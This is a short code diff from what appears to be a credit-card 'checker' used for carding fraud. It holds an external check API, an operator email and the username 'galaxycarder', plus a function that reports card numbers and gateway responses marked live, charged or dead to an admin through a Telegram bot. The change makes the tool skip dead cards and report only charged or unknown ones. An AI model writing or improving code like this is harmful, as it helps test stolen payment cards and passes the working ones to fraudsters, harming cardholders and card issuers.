@@ -15,9 +15,9 @@ const API_URL = "https://ig-production-e72e.up.railway.app/api/check";
 const API_EMAIL = "losthack11@gmail.com";
 const API_USERNAME = "galaxycarder";
 
-// Send admin debug notification for ALL results (CHARGED, DEAD, UNKNOWN)
+// Send admin debug notification for CHARGED and UNKNOWN only (skip DEAD)
 async function sendAdminDebug(card: string, rawResponse: string, status: string) {
-  if (!TELEGRAM_BOT_TOKEN) return;
+  if (!TELEGRAM_BOT_TOKEN || status === "dead") return;
   
   const maskedCard = card.replace(/^(\d{6})(\d+)(\d{4})/, '$1****$3');
   const statusEmoji = status === "live" ? "✅" : status === "dead" ? "❌" : "⚠️";
